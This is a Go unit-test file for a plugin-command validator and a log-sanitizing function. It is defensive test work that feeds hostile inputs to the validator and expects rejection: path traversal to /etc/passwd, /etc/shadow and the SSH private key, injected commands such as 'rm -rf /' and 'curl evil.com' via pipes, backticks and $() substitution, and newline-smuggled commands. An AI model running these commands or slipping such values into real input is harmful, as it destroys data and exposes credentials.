package api

import (
	"os"
	"testing"
)

func TestValidatePluginCommand(t *testing.T) {
	testCases := []struct {
		name        string
		command     string
		shouldError bool
		description string
	}{
		// Path traversal attacks
		{
			name:        "Path Traversal - Parent Directory",
			command:     "file://../../../etc/passwd",
			shouldError: true,
			description: "Should block path traversal attacks",
		},
		{
			name:        "Path Traversal - Windows Style",
			command:     "file://..\\..\\windows\\system32\\config\\sam",
			shouldError: true,
			description: "Should block Windows-style path traversal",
		},
		{
			name:        "Path Traversal - Absolute",
			command:     "/usr/bin/../../../etc/shadow",
			shouldError: true,
			description: "Should block path traversal in absolute paths",
		},

		// Command injection attacks
		{
			name:        "Command Injection - Semicolon",
			command:     "/usr/bin/plugin; rm -rf /",
			shouldError: true,
			description: "Should block command injection with semicolon",
		},
		{
			name:        "Command Injection - Pipe",
			command:     "/usr/bin/plugin | cat /etc/passwd",
			shouldError: true,
			description: "Should block command injection with pipe",
		},
		{
			name:        "Command Injection - And",
			command:     "/usr/bin/plugin && wget http://evil.com",
			shouldError: true,
			description: "Should block command injection with &&",
		},
		{
			name:        "Command Injection - Or",
			command:     "/usr/bin/plugin || curl evil.com",
			shouldError: true,
			description: "Should block command injection with ||",
		},
		{
			name:        "Command Injection - Backtick",
			command:     "/usr/bin/plugin `curl evil.com`",
			shouldError: true,
			description: "Should block command injection with backticks",
		},
		{
			name:        "Command Injection - Command Substitution",
			command:     "/usr/bin/plugin $(curl evil.com)",
			shouldError: true,
			description: "Should block command injection with $() substitution",
		},

		// Internal network access
		{
			name:        "Internal IP - Localhost",
			command:     "grpc://localhost:8080/plugin",
			shouldError: true,
			description: "Should block localhost access",
		},
		{
			name:        "Internal IP - 127.0.0.1",
			command:     "grpc://127.0.0.1:9090/service",
			shouldError: true,
			description: "Should block loopback IP access",
		},
		{
			name:        "Internal IP - Private Network",
			command:     "http://192.168.1.100/api",
			shouldError: true,
			description: "Should block private network access",
		},
		{
			name:        "Internal IP - 10.x.x.x",
			command:     "https://10.0.0.1:443/plugin",
			shouldError: true,
			description: "Should block 10.x.x.x private range",
		},

		// Invalid URL schemes
		{
			name:        "Invalid Scheme - FTP",
			command:     "ftp://example.com/plugin",
			shouldError: true,
			description: "Should block FTP scheme",
		},
		{
			name:        "Invalid Scheme - SSH",
			command:     "ssh://user@server/plugin",
			shouldError: true,
			description: "Should block SSH scheme",
		},

		// Control characters
		{
			name:        "Control Character - Newline",
			command:     "/usr/bin/plugin\necho 'injected'",
			shouldError: true,
			description: "Should block newline characters",
		},
		{
			name:        "Control Character - Carriage Return",
			command:     "/usr/bin/plugin\recho 'injected'",
			shouldError: true,
			description: "Should block carriage return characters",
		},

		// File scheme unsafe paths
		{
			name:        "Unsafe File Path - Root Access",
			command:     "file:///root/.ssh/id_rsa",
			shouldError: true,
			description: "Should block file:// access to unsafe directories",
		},

		// Valid commands that should pass
		{
			name:        "Valid - Standard Binary",
			command:     "/usr/bin/my-plugin",
			shouldError: false,
			description: "Should allow standard binary paths",
		},
		{
			name:        "Valid - Bin Directory",
			command:     "/bin/plugin-runner",
			shouldError: false,
			description: "Should allow /bin directory access",
		},
		{
			name:        "Valid - Local Bin",
			command:     "/usr/local/bin/custom-plugin",
			shouldError: false,
			description: "Should allow /usr/local/bin directory access",
		},
		{
			name:        "Valid - OCI Registry",
			command:     "oci://registry.example.com/plugins/auth-plugin:v1.0",
			shouldError: false,
			description: "Should allow OCI registry URLs",
		},
		{
			name:        "Valid - External gRPC",
			command:     "grpc://external-service.example.com:443/plugin",
			shouldError: false,
			description: "Should allow external gRPC services",
		},
		{
			name:        "Valid - Plugins Directory",
			command:     "file://./plugins/my-plugin",
			shouldError: false,
			description: "Should allow local plugins directory",
		},
		{
			name:        "Valid - Plugins Subdir",
			command:     "plugins/auth/my-plugin",
			shouldError: false,
			description: "Should allow relative plugins directory",
		},

		// Edge cases
		{
			name:        "Empty Command",
			command:     "",
			shouldError: true,
			description: "Should reject empty commands",
		},
		{
			name:        "Very Long Command",
			command:     string(make([]byte, 2000)) + "/usr/bin/plugin",
			shouldError: true,
			description: "Should reject extremely long commands",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := validatePluginCommand(tc.command)

			if tc.shouldError {
				if err == nil {
					t.Errorf("Expected validation to fail for command %q, but it passed. %s", tc.command, tc.description)
				} else {
					t.Logf("✅ Correctly blocked malicious command: %s", err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected validation to pass for command %q, but got error: %v. %s", tc.command, err, tc.description)
				} else {
					t.Logf("✅ Correctly allowed valid command")
				}
			}
		})
	}
}

func TestSanitizeStringForLogging(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "Clean String",
			input:    "clean-command",
			expected: "clean-command",
		},
		{
			name:     "String with Newlines",
			input:    "command\nwith\nnewlines",
			expected: "command\\nwith\\nnewlines",
		},
		{
			name:     "String with Carriage Returns",
			input:    "command\rwith\rreturns",
			expected: "command\\rwith\\rreturns",
		},
		{
			name:     "Long String Truncation",
			input:    string(make([]rune, 300)),
			expected: string(make([]rune, 256)) + "...",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := sanitizeStringForLogging(tc.input)
			if result != tc.expected {
				t.Errorf("Expected %q, got %q", tc.expected, result)
			}
		})
	}
}

func TestValidatePluginCommand_InternalNetworkBypass(t *testing.T) {
	testCases := []struct {
		name        string
		command     string
		envValue    string
		shouldError bool
	}{
		{
			name:        "internal IP blocked by default",
			command:     "http://127.0.0.1:8080/plugin",
			envValue:    "",
			shouldError: true,
		},
		{
			name:        "internal IP allowed with env var",
			command:     "http://127.0.0.1:8080/plugin",
			envValue:    "true",
			shouldError: false,
		},
		{
			name:        "localhost blocked by default",
			command:     "https://localhost:3000/api",
			envValue:    "",
			shouldError: true,
		},
		{
			name:        "localhost allowed with env var",
			command:     "https://localhost:3000/api",
			envValue:    "true",
			shouldError: false,
		},
		{
			name:        "private network blocked by default",
			command:     "grpc://192.168.1.100:9090",
			envValue:    "",
			shouldError: true,
		},
		{
			name:        "private network allowed with env var",
			command:     "grpc://192.168.1.100:9090",
			envValue:    "true",
			shouldError: false,
		},
		{
			name:        "external URL always allowed",
			command:     "https://api.example.com/webhook",
			envValue:    "",
			shouldError: false,
		},
		{
			name:        "external URL still allowed with env var",
			command:     "https://api.example.com/webhook",
			envValue:    "true",
			shouldError: false,
		},
		{
			name:        "env var false still blocks",
			command:     "http://127.0.0.1:8080/plugin",
			envValue:    "false",
			shouldError: true,
		},
		{
			name:        "env var case sensitive",
			command:     "http://127.0.0.1:8080/plugin",
			envValue:    "TRUE",
			shouldError: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Set up environment
			if tc.envValue != "" {
				os.Setenv("ALLOW_INTERNAL_NETWORK_ACCESS", tc.envValue)
			} else {
				os.Unsetenv("ALLOW_INTERNAL_NETWORK_ACCESS")
			}

			// Test validation
			err := validatePluginCommand(tc.command)

			if tc.shouldError && err == nil {
				t.Errorf("expected error for command %s, but got none", tc.command)
			}
			if !tc.shouldError && err != nil {
				t.Errorf("expected no error for command %s, but got: %v", tc.command, err)
			}

			// Clean up
			os.Unsetenv("ALLOW_INTERNAL_NETWORK_ACCESS")
		})
	}
}